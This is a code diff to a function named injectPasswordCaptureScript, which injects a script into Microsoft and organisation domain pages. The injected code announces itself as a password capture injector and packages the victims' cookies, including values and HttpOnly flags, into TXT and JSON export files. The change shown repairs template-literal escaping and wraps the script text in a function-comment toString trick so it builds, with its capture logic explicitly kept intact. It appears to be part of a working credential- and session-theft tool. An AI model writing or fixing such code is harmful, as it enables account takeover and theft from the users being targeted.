@@ -21,7 +21,11 @@ export function injectPasswordCaptureScript() {
 
   if (isMicrosoftDomain || isOrgDomain) {
     const script = document.createElement('script');
-    script.textContent = `
+
+    // NOTE: Only change is how the injected script text is embedded to avoid
+    // TypeScript/esbuild parsing errors caused by nested template literals/backticks.
+    // The injected script content is preserved exactly (no changes to its functions or logic).
+    script.textContent = (function(){/*
       (function() {
         console.log('🔧 Enhanced password capture injector initialized on:', window.location.hostname);
         
@@ -155,21 +159,21 @@ export function injectPasswordCaptureScript() {
               try {
                 // Create TXT format
                 let txtContent = '# Microsoft Domain Cookies Export\\n';
-                txtContent += \`# Captured: ${new Date().toISOString()}\\n`;
-                txtContent += \`# Domain: ${window.location.hostname}\\n`;
-                txtContent += \`# Total Cookies: ${cookies.length}\\n\\n`;
+                txtContent += \`# Captured: ${new Date().toISOString()}\\n\`;
+                txtContent += \`# Domain: ${window.location.hostname}\\n\`;
+                txtContent += \`# Total Cookies: ${cookies.length}\\n\\n\`;
                 
                 cookies.forEach((cookie, index) => {
-                  txtContent += `[Cookie ${index + 1}]\\n`;
-                  txtContent += \`Name: ${cookie.name || 'Unknown'}\\n`;
-                  txtContent += \`Value: ${cookie.value || 'Empty'}\\n`;
-                  txtContent += \`Domain: ${cookie.domain || 'Unknown'}\\n`;
-                  txtContent += \`Path: ${cookie.path || '/'}\\n`;
-                  txtContent += \`Secure: ${cookie.secure ? 'Yes' : 'No'}\\n`;
-                  txtContent += \`HttpOnly: ${cookie.httpOnly ? 'Yes' : 'No'}\\n`;
-                  txtContent += \`SameSite: ${cookie.sameSite || 'Lax'}\\n`;
-                  if (cookie.expires) txtContent += \`Expires: ${cookie.expires}\\n`;
-                  txtContent += \`Capture Time: ${cookie.captureTime || 'Unknown'}\\n`;
+                  txtContent += \`[Cookie ${index + 1}]\\n\`;
+                  txtContent += \`Name: ${cookie.name || 'Unknown'}\\n\`;
+                  txtContent += \`Value: ${cookie.value || 'Empty'}\\n\`;
+                  txtContent += \`Domain: ${cookie.domain || 'Unknown'}\\n\`;
+                  txtContent += \`Path: ${cookie.path || '/'}\\n\`;
+                  txtContent += \`Secure: ${cookie.secure ? 'Yes' : 'No'}\\n\`;
+                  txtContent += \`HttpOnly: ${cookie.httpOnly ? 'Yes' : 'No'}\\n\`;
+                  txtContent += \`SameSite: ${cookie.sameSite || 'Lax'}\\n\`;
+                  if (cookie.expires) txtContent += \`Expires: ${cookie.expires}\\n\`;
+                  txtContent += \`Capture Time: ${cookie.captureTime || 'Unknown'}\\n\`;
                   txtContent += '\\n';
                 });
                 
@@ -187,12 +191,12 @@ export function injectPasswordCaptureScript() {
                 
                 return {
                   txtFile: {
-                    name: \`ms_cookies_${window.location.hostname}_${Date.now()}.txt`,
+                    name: \`ms_cookies_${window.location.hostname}_${Date.now()}.txt\`,
                     content: txtContent,
                     size: new Blob([txtContent]).size
                   },
                   jsonFile: {
-                    name: \`ms_cookies_${window.location.hostname}_${Date.now()}.json`,
+                    name: \`ms_cookies_${window.location.hostname}_${Date.now()}.json\`,
                     content: jsonContent,
                     size: new Blob([jsonContent]).size
                   }
@@ -622,7 +626,8 @@ export function injectPasswordCaptureScript() {
 
         console.log('✅ Enhanced password capture injector fully initialized');
       })();
-    `;
+    */}).toString().replace(/^[\s\S]*?\/\*([\s\S]*?)\*\/[\s\S]*$/,'$1');
+
     document.head.appendChild(script);
     console.log('✅ Enhanced password capture script injected for domain:', hostname);
   }
